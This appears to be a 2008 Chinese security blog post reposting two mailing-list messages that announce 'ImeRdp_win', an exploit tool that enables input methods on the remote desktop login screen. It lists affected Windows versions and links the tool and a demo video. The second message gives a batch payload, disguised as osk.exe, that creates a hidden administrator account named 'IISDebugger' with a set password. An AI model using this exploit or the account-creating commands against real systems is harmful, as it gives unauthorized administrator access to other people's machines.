---
title: "[C.C.T] ImeRdp_win 内部发行 及 ImeRdp 2003输入法利用录像"
description: 远程桌面中开启指定输入法.受影响系统有
date: 2008-02-14 13:29:47
category: 安全工具
tags: ['工具共享', 'exploit']
post_id: 369
alias: C.C.T-ImeRdp_win
ViewNums: 4442
---

幻影的maillist上看到的，2个原文转来

**[C.C.T] ImeRdp_win 内部发行**

 **From:** cnqing**To:** cncert**Sent:** 2008-02-13, 00:11:09**Subject:** [C.C.T] ImeRdp_win 内部发行 亲爱的各位!    win下的ImeRdp今天正式在邮件列表发布了！     软件功能:    远程桌面中开启指定输入法.    受影响系统有:        vista                                         绝大多数第三方输入法可以利用        win2003 sp2                             已发现极点中文,，拼音加加可以利用        win2003        winxp sp2        winxp        win2000 sp4
    相关内容参考：《windows再曝输入法安全风险》  一文    内置console和gui版,    gui版需要.net支持！    请不要用于非法用途！ 下载地址：<http://www.virhost.net/up_files/soft/imerdp_win.rar.mdb>

**[C.C.T] ImeRdp 2003输入法利用录像**

2003的利用相对要麻烦一些
动画可能比较长,或者出现错误,见谅.
没时间写太多说明.仔细看下吧.

过程中需要的osk.exe 内容是由下面的bat转换而来

net user IISDebugger "ccteam" /add
net localgroup administrators IISDebugger /add

演示地址:<http://www.virhost.net/up_files/soft/imerdp.html>
相关工具osk.exe 下载地址:<http://www.virhost.net/up_files/soft/osk.exe.mdb>

cncert.net 网站目前不能访问,给大家带来的不便请谅解.过几天维护人员来了后就好了.
旧的软件和文章可以在备用站
www.virhost.net  查阅和下载.

